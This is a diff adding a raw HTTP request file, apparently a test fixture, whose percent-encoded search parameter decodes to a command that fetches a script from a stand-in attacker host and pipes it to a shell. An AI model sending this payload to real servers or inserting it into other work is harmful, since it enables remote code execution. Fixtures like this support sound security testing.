@@ -1,0 +1,4 @@
+GET /a?search=%63%75%72%6C%20%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%74%6C%64%2F%69%2E%73%68%20%7C%20%73%68 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
